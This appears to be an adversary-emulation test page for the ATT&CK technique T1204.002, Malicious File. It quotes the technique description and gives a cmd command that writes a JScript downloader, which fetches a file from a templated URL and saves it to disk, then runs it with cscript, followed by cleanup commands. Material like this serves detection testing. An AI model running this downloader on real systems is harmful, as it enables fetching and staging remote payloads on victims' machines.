# T1204.002 - Malicious File
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1204/002)
<blockquote>An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) on the file to increase the likelihood that a user will open it.

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).</blockquote>

**Supported Platforms:** Windows




#### Inputs:
| Name        | Description                       | Type | Default Value             |
| ----------- | --------------------------------- | ---- | ------------------------- |

#### Attack Commands: Run with `command_prompt`! 


```cmd
echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('/T1204.002', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
```

#### Cleanup Commands:
```cmd
del #{script_file} /F /Q >nul 2>&1
del T1204.002 /F /Q >nul 2>&1
